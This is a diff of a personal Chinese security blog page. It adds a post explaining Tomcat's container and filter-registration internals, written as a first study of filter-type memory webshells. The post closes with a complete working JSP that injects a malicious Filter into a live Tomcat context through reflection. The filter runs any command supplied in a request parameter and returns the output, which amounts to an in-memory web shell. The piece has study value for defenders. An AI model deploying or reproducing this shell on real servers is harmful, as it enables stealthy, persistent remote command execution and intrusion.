@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">Tag: Java | pyshare&#39;s blog</title>
+  <title itemprop="name">内存马初探 | pyshare&#39;s blog</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -372,229 +372,542 @@
   </div>
 </header>
 
-      
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
 <div class="pattern-center-blank"></div>
-<div class="pattern-center ">
-  <div class="pattern-attachment-img">
-    <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/banner/coding.jpg" class="lazyload" onerror="imgError(this,3)" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;">
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://tva1.sinaimg.cn/large/008eGmZEly1gpo275vb4dj31hc0u0kiw.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://tva1.sinaimg.cn/large/008eGmZEly1gpo275vb4dj31hc0u0kiw.jpg">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      内存马初探</h1>
+      <p class="entry-census">
+        <span>
+          <a href="york145.github.io/">
+            <img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpo275vb4dj31hc0u0kiw.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="york145.github.io/">xiaotan</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2021-4-18<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
   </div>
-  <header class="pattern-header ">
-    <h1 class="cat-title">Java</h1>
-  </header>
-</div>
+
 <div id="content" class="site-content">
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <h1 id="内存马初探-Filter"><a href="#内存马初探-Filter" class="headerlink" title="内存马初探-Filter"></a>内存马初探-Filter</h1><h2 id="Tomcat简介"><a href="#Tomcat简介" class="headerlink" title="Tomcat简介"></a>Tomcat简介</h2><p>tomcat其实质上就是一个大点的servlet容器，那什么是容器呢，我觉得其实就是一个类。在tomcat中各个容器之间嵌套。而这些容器都是有生命周期的java类，都继承了共同的接口Lifecycle，所以Lifecycle就是这些容器的顶层接口。下面来谈谈存在哪些容器。</p>
+<h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><ul>
+<li>init()方法：初始化容器组件，它必须在启动容器之前调用。它会创建许多对象。</li>
+<li>start():启动容器，比如启动一个Server。</li>
+<li>stop()：停止执行</li>
+<li>destroy()：销毁这个容器。</li>
+<li>Server容器：一个StandardServer类实例就表示一个Server容器</li>
+<li>Service容器：一个StandardService类实例就表示一个Service容器</li>
+<li>Engine容器：一个StandardEngine类实例就表示一个Engine容器。</li>
+<li>Host容器：一个StandardHost类实例就表示一个Host容器。</li>
+<li>Context容器：一个StandardContext类实例就表示一个Context容器。</li>
+<li>Wrapper容器：一个StandardWrapper类实例就表示一个Wrapper容器。</li>
+</ul>
+<p>这些容器全都是从上到下嵌套，<strong>需要注意的是这些容器虽然存在父子关系，但是它们的java类并没有父子。</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpnsa4ppxhj30o60mwmyx.jpg" alt=""></p>
+<pre><code class="java">/**
+     * Add a child Container, only if the proposed child is an implementation
+     * of Context.
+     *
+     * @param child Child container to be added
+     */
+    @Override
+    public void addChild(Container child) &#123;
+
+        child.addLifecycleListener(new MemoryLeakTrackingListener());
+
+        if (!(child instanceof Context))//这里说明Host容器的子容器只能是Context容器
+            throw new IllegalArgumentException
+                (sm.getString(&quot;standardHost.notContext&quot;));
+        super.addChild(child);
+
+    &#125;
+</code></pre>
+<p>一个Host容器中可以有多个Wrapper容器。</p>
+<pre><code class="java">    /**
+     * Add a child Container, only if the proposed child is an implementation
+     * of Wrapper.
+     *
+     * @param child Child container to be added
+     *
+     * @exception IllegalArgumentException if the proposed container is
+     *  not an implementation of Wrapper
+     */
+    @Override
+    public void addChild(Container child) &#123;
+
+        // Global JspServlet
+        Wrapper oldJspServlet = null;
+
+        if (!(child instanceof Wrapper)) &#123;//这里说明Context容器的子容器只能是Wrapper容器。
+            throw new IllegalArgumentException
+                (sm.getString(&quot;standardContext.notWrapper&quot;));
+        &#125;
+　　　　　　//这里删除了部分代码
+
+    &#125;</code></pre>
+<h2 id="内存马简单介绍"><a href="#内存马简单介绍" class="headerlink" title="内存马简单介绍"></a>内存马简单介绍</h2><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ul>
+<li>servlet-api<ul>
+<li>filter型</li>
+<li>servlet型</li>
+<li>listener型</li>
+</ul>
+</li>
+<li>指定框架，如spring</li>
+<li>字节码增强型</li>
+<li>任意JSP文件隐藏</li>
+</ul>
+<p>在Tomcat中我们对Servlet进行访问的时候会先通过Filter，如下图所示。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpnt4cngtwj30hv0abjrc.jpg" alt=""></p>
+<p>因此我们只要中Filter中插入恶意代码，就可以进行命令执行，形成一个内存马。</p>
+<p>Filter：自定义Filter的实现，需要实现javax.servlet.Filter下的init()、doFilter()、destroy()三个方法。</p>
+<ul>
+<li>启动时调用init()方法</li>
+<li>工作时调用doFilter()</li>
+<li>销毁时调用destroy()</li>
+</ul>
+<p>在tomcat中ServletContext的实现是ApplicationContext。在Web应用中，获取的ServletContext实际上是ApplicationContextFacade的对象，对ApplicationContext进行了封装，而ApplicationContext实例中又包含了StandardContext实例，。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpnthaev47j30q80wegs4.jpg" alt=""></p>
+<h3 id="Filter注册流程"><a href="#Filter注册流程" class="headerlink" title="Filter注册流程"></a>Filter注册流程</h3><p>我们自己写一个Filter然后下断点，然后跟进createFilterChain。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpny2fgoorj31do0e4jui.jpg" alt=""></p>
+<pre><code class="java">filterChain.setServlet(servlet);
+            filterChain.setSupport(((StandardWrapper)wrapper).getInstanceSupport());
+            StandardContext context = (StandardContext)wrapper.getParent();
+            FilterMap[] filterMaps = context.findFilterMaps();
+            if (filterMaps != null &amp;&amp; filterMaps.length != 0) &#123;
+                String servletName = wrapper.getName();
+
+                int i;
+                ApplicationFilterConfig filterConfig;
+                boolean isCometFilter;
+                for(i = 0; i &lt; filterMaps.length; ++i) &#123;
+                    if (this.matchDispatcher(filterMaps[i], dispatcher) &amp;&amp; this.matchFiltersURL(filterMaps[i], requestPath)) &#123;
+                        filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMaps[i].getFilterName());
+                        if (filterConfig != null) &#123;
+                            isCometFilter = false;
+                            if (comet) &#123;
+                                try &#123;
+                                    isCometFilter = filterConfig.getFilter() instanceof CometFilter;
+                                &#125; catch (Exception var18) &#123;
+                                    Throwable t = ExceptionUtils.unwrapInvocationTargetException(var18);
+                                    ExceptionUtils.handleThrowable(t);
+                                &#125;
+
+                                if (isCometFilter) &#123;
+                                    filterChain.addFilter(filterConfig);
+                                &#125;
+                            &#125; else &#123;
+                                filterChain.addFilter(filterConfig);
+                            &#125;
+                        &#125;
+                    &#125;
+                &#125;
+
+                for(i = 0; i &lt; filterMaps.length; ++i) &#123;
+                    if (this.matchDispatcher(filterMaps[i], dispatcher) &amp;&amp; this.matchFiltersServlet(filterMaps[i], servletName)) &#123;
+                        filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMaps[i].getFilterName());
+                        if (filterConfig != null) &#123;
+                            isCometFilter = false;
+                            if (comet) &#123;
+                                try &#123;
+                                    isCometFilter = filterConfig.getFilter() instanceof CometFilter;
+                                &#125; catch (Exception var17) &#123;
+                                &#125;
+
+                                if (isCometFilter) &#123;
+                                    filterChain.addFilter(filterConfig);
+                                &#125;
+                            &#125; else &#123;
+                                filterChain.addFilter(filterConfig);
+                            &#125;
+                        &#125;
+                    &#125;
+                &#125;
+
+                return filterChain;
+            &#125; else &#123;
+                return filterChain;
+            &#125;
+        &#125;</code></pre>
+<p>可以看见这里主要是对filterconfig和filterMap进行的操作，而在代码中首先获取了StandardContext其中有三个成员变量和filter相关：</p>
+<p>filter关键的3个属性和2个方法</p>
+<ul>
+<li>FilterConfigs存放了filterDef还保存了当时的Context</li>
+<li>FilterDefs存放了filter的定义，比如名称跟对应的类，类似于<pre><code>  &lt;filter&gt;
+      &lt;filter-name&gt;filterDemo&lt;/filter-name&gt;
+      &lt;filter-class&gt;filterDemo&lt;/filter-class&gt;
+  &lt;/filter&gt;</code></pre></li>
+<li>FilterMaps 存放了所有filter相关的信息包括filterName和urlPattern</li>
+<li>addFilterDef(填充filterDef对象)</li>
+<li>filterStart(初始化 filterConfigs )</li>
+</ul>
+<pre><code class="java">//tomcat 标准 context
+public class StandardContext extends ContainerBase
+        implements Context, NotificationEmitter &#123;
+
+    //servletContext 
+    protected ApplicationContext context = null;
+    //获取servletContext
+    @Override
+    public ServletContext getServletContext() &#123;
+        if (context == null) &#123;
+            context = new ApplicationContext(this);
+            if (altDDName != null)
+                context.setAttribute(Globals.ALT_DD_ATTR,altDDName);
+        &#125;
+        return context.getFacade();
+    &#125;
+
+    //filterMaps 封装的对象
+    private final ContextFilterMaps filterMaps = new ContextFilterMaps();    
+    @Override
+    //servletContext添加filter时调用
+    public void addFilterMap(FilterMap filterMap) &#123;
+        validateFilterMap(filterMap);
+        // Add this filter mapping to our registered set
+        filterMaps.add(filterMap);
+        fireContainerEvent(&quot;addFilterMap&quot;, filterMap);
+    &#125;
+    //获取filterMaps 
+    //请求到达时获取
+    @Override
+    public FilterMap[] findFilterMaps() &#123;
+        return filterMaps.asArray();
+    &#125;
+
+    //filtername 和 filterconfig 映射
+    private Map&lt;String, ApplicationFilterConfig&gt; filterConfigs = new HashMap&lt;&gt;();
+    //通过filtername获取filterconfig bean实例
+    public FilterConfig findFilterConfig(String name) &#123;
+        return filterConfigs.get(name);
+    &#125;
+    //通过 filterDefs 生成 filterconfigs 映射
+
+    public boolean filterStart() &#123;
+
+        if (getLogger().isDebugEnabled()) &#123;
+            getLogger().debug(&quot;Starting filters&quot;);
+        &#125;
+        // Instantiate and record a FilterConfig for each defined filter
+        boolean ok = true;
+        synchronized (filterConfigs) &#123;
+            filterConfigs.clear();
+            for (Entry&lt;String,FilterDef&gt; entry : filterDefs.entrySet()) &#123;
+                String name = entry.getKey();
+                if (getLogger().isDebugEnabled()) &#123;
+                    getLogger().debug(&quot; Starting filter &#39;&quot; + name + &quot;&#39;&quot;);
+                &#125;
+                try &#123;
+                    ApplicationFilterConfig filterConfig =
+                            new ApplicationFilterConfig(this, entry.getValue());
+                    filterConfigs.put(name, filterConfig);
+                &#125; catch (Throwable t) &#123;
+                    t = ExceptionUtils.unwrapInvocationTargetException(t);
+                    ExceptionUtils.handleThrowable(t);
+                    getLogger().error(sm.getString(
+                            &quot;standardContext.filterStart&quot;, name), t);
+                    ok = false;
+                &#125;
+            &#125;
+        &#125;
+
+        return ok;
+    &#125;
+
+
+    //filterDefs定义
+    private Map&lt;String, FilterDef&gt; filterDefs = new HashMap&lt;&gt;();
+    //添加filterDef
+    public void addFilterDef(FilterDef filterDef) &#123;
+
+        synchronized (filterDefs) &#123;
+            filterDefs.put(filterDef.getFilterName(), filterDef);
+        &#125;
+        fireContainerEvent(&quot;addFilterDef&quot;, filterDef);
+
+    &#125;
+    //查找filterDef
+    public FilterDef findFilterDef(String filterName) &#123;
+        synchronized (filterDefs) &#123;
+            return filterDefs.get(filterName);
+        &#125;
+    &#125;
+
+&#125;</code></pre>
+<p>ApplicationContext</p>
+<p>实现了 ServletContext 中的 addFilter 方法</p>
+<p>向属性中的StandandContext实例添加filterDef</p>
+<pre><code class="java">public class ApplicationContext implements ServletContext &#123;
+    //标准上下文属性  包含 filterConfigs filterMaps filterDefs 属性
+    private final StandardContext context;
+
+    //调用StandandContext添加filterDef
+    private FilterRegistration.Dynamic addFilter(String filterName,
+            String filterClass, Filter filter) throws IllegalStateException &#123;
+
+        if (filterName == null || filterName.equals(&quot;&quot;)) &#123;
+            throw new IllegalArgumentException(sm.getString(
+                    &quot;applicationContext.invalidFilterName&quot;, filterName));
+        &#125;
+
+        if (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;
+            //TODO Spec breaking enhancement to ignore this restriction
+            throw new IllegalStateException(
+                    sm.getString(&quot;applicationContext.addFilter.ise&quot;,
+                            getContextPath()));
+        &#125;
+
+        FilterDef filterDef = context.findFilterDef(filterName);
+
+        // Assume a &#39;complete&#39; FilterRegistration is one that has a class and
+        // a name
+        if (filterDef == null) &#123;
+            filterDef = new FilterDef();
+            filterDef.setFilterName(filterName);
+            context.addFilterDef(filterDef);
+        &#125; else &#123;
+            if (filterDef.getFilterName() != null &amp;&amp;
+                    filterDef.getFilterClass() != null) &#123;
+                return null;
+            &#125;
+        &#125;
+
+        if (filter == null) &#123;
+            filterDef.setFilterClass(filterClass);
+        &#125; else &#123;
+            filterDef.setFilterClass(filter.getClass().getName());
+            filterDef.setFilter(filter);
+        &#125;
+
+        return new ApplicationFilterRegistration(filterDef, context);
+    &#125;
+
+&#125;</code></pre>
+<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol>
+<li>context启动时，调用ServletContainerInitializers添加filter，调用AbstractFilterRegistrationBean类的addRegistration方法向context添加filter</li>
+<li>context中不存在FilterDef则创建对应FilterDef</li>
+<li>AbstractFilterRegistrationBean中configure方法添加匹配filter的uri，默认为/*</li>
+<li>context启动时，调用filterStart方法配置初始化ApplicationFilterConfig</li>
+<li>调用filter的init方法</li>
+<li>对每次到达的请求在StandardWrapperVavel的invoke方法中创建过滤器链</li>
+<li>根据名称获得ApplicationFilterConfig添加到过滤器链，通过ApplicationFilterConfig来获取filter执行</li>
+</ol>
+<h3 id="具体函数"><a href="#具体函数" class="headerlink" title="具体函数"></a>具体函数</h3><ol>
+<li><p>ServletContainerInitializer(TomcatStarter实现类).onStartup() 调用 ServletContextInitializer.onStartup(ServletContext)</p>
+</li>
+<li><p>ServletContextInitializer(AbstractFilterRegistrationBean实现类).onStartup(ServletContext) 调用 ServletContext.addFilter() 方法</p>
+</li>
+<li><p>ServletContext(ApplicationContext实现类).addFilter 方法调用了 StandandContext.addFilterDef()</p>
+</li>
+<li><p>StandandContext.addFilterDef() 方法填充 StandandContext.filterDefs</p>
+</li>
+<li><p>StandandContext.filterStart()方法根据 StandandContext.filterDefs属性 填充 StandandContext.filterConfigs</p>
+</li>
+<li><p>ApplicationFilterFactory根据StandandContext生成filterchain</p>
+</li>
+<li><p>StandardWrapperValve中调用filterchain.doFilter() 方法</p>
+</li>
+<li><p>filterchain结束后调用servlet.service方法</p>
+</li>
+</ol>
+<h3 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h3><ul>
+<li>获取standcontext</li>
+<li>创建恶意Filter</li>
+<li>创建FilterDef并将Filtername和FilterClass放入</li>
+<li>将FilterDef添加到FilterDefs和filterconfig中</li>
+<li>创建一个新的filterMap将URL跟filter进行绑定，并添加到filterMaps中因为filter生效会有一个先后顺序，所以一般来讲我们还需要把我们的filter给移动到FilterChain的第一位去。</li>
+</ul>
+<h3 id="如何获取stancontext"><a href="#如何获取stancontext" class="headerlink" title="如何获取stancontext"></a>如何获取stancontext</h3><p>到这里我们就要思考context是如何获取的呢？下面给出三种方法</p>
+<ul>
+<li>由ServletContext转StandardContext如果可以直接获取到request对象的话可以用这种方法</li>
+<li>从当前线程中获取</li>
+<li>从MBean中获取<br>最后给出代码：</li>
+</ul>
+<pre><code class="java">&lt;%--
+  Created by IntelliJ IDEA.
+  User: xiaotan
+  Date: 2021/4/16
+  Time: 21:03
+  To change this template use File | Settings | File Templates.
+--%&gt;
+&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Title&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;%
+    String name =&quot;pyshare&quot;;
+    ServletContext servletContext = request.getServletContext();
+    ApplicationContextFacade contextFacade = (ApplicationContextFacade) servletContext;
+    Field applicationContextField = ApplicationContextFacade.class.getDeclaredField(&quot;context&quot;);
+    applicationContextField.setAccessible(true);
+    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(contextFacade);
+    Field field = ApplicationContext.class.getDeclaredField(&quot;context&quot;);
+    field.setAccessible(true);
+    StandardContext standardContext = (StandardContext) field.get(applicationContext);
+
+    Field filterConfigs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);
+    filterConfigs.setAccessible(true);
+    Map configs = (Map) filterConfigs.get(standardContext);
+
+    if (configs.get(name) == null)&#123;
+        Filter filter = new Filter()&#123;
+            @Override
+            public void init(FilterConfig filterConfig)  &#123;
+            &#125;
+            @Override
+            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;
+                String cmd;
+                if ((cmd = servletRequest.getParameter(&quot;pyshare&quot;)) != null) &#123;
+                    Process process = Runtime.getRuntime().exec(cmd);
+                    java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
+                            new java.io.InputStreamReader(process.getInputStream()));
+                    StringBuilder stringBuilder = new StringBuilder();
+                    String line;
+                    while ((line = bufferedReader.readLine()) != null) &#123;
+                        stringBuilder.append(line + &#39;\n&#39;);
+                    &#125;
+                    servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
+                    servletResponse.getOutputStream().flush();
+                    servletResponse.getOutputStream().close();
+                    return;
+                &#125;
+                filterChain.doFilter(servletRequest, servletResponse);
+            &#125;
+            @Override
+            public void destroy() &#123;
+            &#125;
+        &#125;;
+        FilterDef filterDef = new FilterDef();
+        filterDef.setFilter(filter);
+        filterDef.setFilterName(name);
+        filterDef.setFilterClass(filter.getClass().getName());
+
+        standardContext.addFilterDef(filterDef);
+
+        FilterMap filterMap = new FilterMap();
+        filterMap.setFilterName(name);
+        filterMap.setDispatcher(DispatcherType.REQUEST.name());
+        filterMap.addURLPattern(&quot;/*&quot;);
+        /**
+         * 将filtermap 添加到 filterMaps 中的第一个位置
+         */
+        standardContext.addFilterMapBefore(filterMap);
+
+        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
+        constructor.setAccessible(true);
+        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
+
+        configs.put(name,filterConfig);
+
+        out.write(&quot;success&quot;);
+    &#125;
+%&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpnzmkkhd9j310v0u0txq.jpg" alt=""></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>但是其实还是没有实现无文件，后面还要结合反序列化漏洞注入内存马</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w">https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/219177">https://www.anquanke.com/post/id/219177</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw">https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw</a></p>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/York145/CDN@1.0.3/img/custom/donate/AliPayQR.jpg"></li>
+                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/York145/CDN@1.0.3/img/custom/donate/WeChanQR.jpg"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+          
+            <div class="post-nepre full next">
+          
+            <a href="/2021/04/11/solr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90--CVE-2017-3163/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://tva1.sinaimg.cn/large/008eGmZEly1gpewrft16cj31c00u0wx1.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://tva1.sinaimg.cn/large/008eGmZEly1gpewrft16cj31c00u0wx1.jpg">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                solr漏洞分析--CVE-2017-3163</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
       
-  <!-- 首页默认取最最新文章集 -->
-  
-    <article class="post post-list" itemscope="" itemtype="https://schema.org/BlogPosting">
-  <div class="post-entry">
-    <div class="feature">
-      <a href="/2021/04/18/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2-Filter/">
-        <div class="overlay">
-          <i class="iconfont icon-text">
-          </i>
-        </div>
-        <img width="150" height="150" src="https://tva1.sinaimg.cn/large/008eGmZEly1gpo275vb4dj31hc0u0kiw.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" >
-      </a>
-    </div>
-    <h1 class="entry-title">
-    <a href="/2021/04/18/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2-Filter/">
-    内存马初探</a>
-    </h1>
-    <div class="p-time">
-      <i class="iconfont icon-time">
-      </i>
-    2021-4-18</div>
-    <p>
-    Java</p>
-    <footer class="entry-footer">
-      <div class="post-more">
-        <a href="/2021/04/18/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2-Filter/">
-          <i class="iconfont icon-caidan">
-          </i>
-        </a>
-      </div>
-    </footer>
-  </div>
-  <hr>
-</article>
-  
-    <article class="post post-list" itemscope="" itemtype="https://schema.org/BlogPosting">
-  <div class="post-entry">
-    <div class="feature">
-      <a href="/2021/04/11/solr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90--CVE-2017-3163/">
-        <div class="overlay">
-          <i class="iconfont icon-text">
-          </i>
-        </div>
-        <img width="150" height="150" src="https://tva1.sinaimg.cn/large/008eGmZEly1gpewrft16cj31c00u0wx1.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" >
-      </a>
-    </div>
-    <h1 class="entry-title">
-    <a href="/2021/04/11/solr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90--CVE-2017-3163/">
-    solr漏洞分析--CVE-2017-3163</a>
-    </h1>
-    <div class="p-time">
-      <i class="iconfont icon-time">
-      </i>
-    2021-4-11</div>
-    <p>
-    Java</p>
-    <footer class="entry-footer">
-      <div class="post-more">
-        <a href="/2021/04/11/solr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90--CVE-2017-3163/">
-          <i class="iconfont icon-caidan">
-          </i>
-        </a>
-      </div>
-    </footer>
-  </div>
-  <hr>
-</article>
-  
-    <article class="post post-list" itemscope="" itemtype="https://schema.org/BlogPosting">
-  <div class="post-entry">
-    <div class="feature">
-      <a href="/2021/04/05/CommonsCollections%203~7%E5%88%86%E6%9E%90/">
-        <div class="overlay">
-          <i class="iconfont icon-text">
-          </i>
-        </div>
-        <img width="150" height="150" src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp924g7eqhj31o00u0dul.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" >
-      </a>
-    </div>
-    <h1 class="entry-title">
-    <a href="/2021/04/05/CommonsCollections%203~7%E5%88%86%E6%9E%90/">
-    CommonsCollections 3～7分析</a>
-    </h1>
-    <div class="p-time">
-      <i class="iconfont icon-time">
-      </i>
-    2021-4-5</div>
-    <p>
-    Java</p>
-    <footer class="entry-footer">
-      <div class="post-more">
-        <a href="/2021/04/05/CommonsCollections%203~7%E5%88%86%E6%9E%90/">
-          <i class="iconfont icon-caidan">
-          </i>
-        </a>
-      </div>
-    </footer>
-  </div>
-  <hr>
-</article>
-  
-    <article class="post post-list" itemscope="" itemtype="https://schema.org/BlogPosting">
-  <div class="post-entry">
-    <div class="feature">
-      <a href="/2021/04/01/CommonsCollections%202%E5%88%86%E6%9E%90/">
-        <div class="overlay">
-          <i class="iconfont icon-text">
-          </i>
-        </div>
-        <img width="150" height="150" src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp4m1tiui1j31hc0u07wi.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" >
-      </a>
-    </div>
-    <h1 class="entry-title">
-    <a href="/2021/04/01/CommonsCollections%202%E5%88%86%E6%9E%90/">
-    CommonsCollections 2分析</a>
-    </h1>
-    <div class="p-time">
-      <i class="iconfont icon-time">
-      </i>
-    2021-4-1</div>
-    <p>
-    Java</p>
-    <footer class="entry-footer">
-      <div class="post-more">
-        <a href="/2021/04/01/CommonsCollections%202%E5%88%86%E6%9E%90/">
-          <i class="iconfont icon-caidan">
-          </i>
-        </a>
-      </div>
-    </footer>
-  </div>
-  <hr>
-</article>
-  
-    <article class="post post-list" itemscope="" itemtype="https://schema.org/BlogPosting">
-  <div class="post-entry">
-    <div class="feature">
-      <a href="/2021/03/03/CommonsCollections%201%E5%88%86%E6%9E%90/">
-        <div class="overlay">
-          <i class="iconfont icon-text">
-          </i>
-        </div>
-        <img width="150" height="150" src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6zeqjin6j21hc0u0b2d.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" >
-      </a>
-    </div>
-    <h1 class="entry-title">
-    <a href="/2021/03/03/CommonsCollections%201%E5%88%86%E6%9E%90/">
-    CommonsCollections 1分析</a>
-    </h1>
-    <div class="p-time">
-      <i class="iconfont icon-time">
-      </i>
-    2021-3-3</div>
-    <p>
-    Java</p>
-    <footer class="entry-footer">
-      <div class="post-more">
-        <a href="/2021/03/03/CommonsCollections%201%E5%88%86%E6%9E%90/">
-          <i class="iconfont icon-caidan">
-          </i>
-        </a>
-      </div>
-    </footer>
-  </div>
-  <hr>
-</article>
-  
-    <article class="post post-list" itemscope="" itemtype="https://schema.org/BlogPosting">
-  <div class="post-entry">
-    <div class="feature">
-      <a href="/2021/02/05/ysoserial%20-URLDNS%E7%9A%84%E5%AD%A6%E4%B9%A0/">
-        <div class="overlay">
-          <i class="iconfont icon-text">
-          </i>
-        </div>
-        <img width="150" height="150" src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/r2e391.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" >
-      </a>
-    </div>
-    <h1 class="entry-title">
-    <a href="/2021/02/05/ysoserial%20-URLDNS%E7%9A%84%E5%AD%A6%E4%B9%A0/">
-    ysoserial -URLDNS的学习</a>
-    </h1>
-    <div class="p-time">
-      <i class="iconfont icon-time">
-      </i>
-    2021-2-5</div>
-    <p>
-    Java</p>
-    <footer class="entry-footer">
-      <div class="post-more">
-        <a href="/2021/02/05/ysoserial%20-URLDNS%E7%9A%84%E5%AD%A6%E4%B9%A0/">
-          <i class="iconfont icon-caidan">
-          </i>
-        </a>
-      </div>
-    </footer>
-  </div>
-  <hr>
-</article>
-  
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
+        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
 
-
-      <div class="clearer">
-      </div>
-    </main>
-    <!--  -->
-    
-  </div>
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="york145.github.io/" class="profile gravatar"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpo275vb4dj31hc0u0kiw.jpg" itemprop="image" alt="xiaotan" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="york145.github.io/" itemprop="url" rel="author">xiaotan</a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i>一个超菜的人</p>
+      </section>
